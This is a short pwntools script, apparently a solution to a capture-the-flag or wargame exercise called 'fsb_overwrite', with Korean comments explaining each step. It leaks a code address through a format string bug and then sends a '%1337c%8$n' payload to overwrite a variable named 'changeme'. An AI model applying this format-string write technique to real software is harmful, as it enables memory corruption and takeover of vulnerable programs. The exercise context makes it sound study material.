from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

p = process("./fsb_overwrite")
elf = ELF("./fsb_overwrite")

context.arch = "amd64"


# [1] Get Address of changeme
p.sendline("%8$p")
leak = int(p.recvline()[:-1], 16)
code_base = leak - elf.symbols["__libc_csu_init"]
changeme = code_base + elf.symbols["changeme"]

slog("code_base", code_base)
slog("changeme", changeme)


# [2] Overwrite changeme
payload = "%1337c"  # 1337 길이의 문자열
payload += "%8$n"   # changeme 주소를 문자열 길이로 덮어씀
payload += "A"*6    # 8의 배수를 맞추기 위한 패딩
payload = payload.encode() + p64(changeme)     # 덮어쓸 changeme 주소를 넣음

p.sendline(payload)

p.interactive()

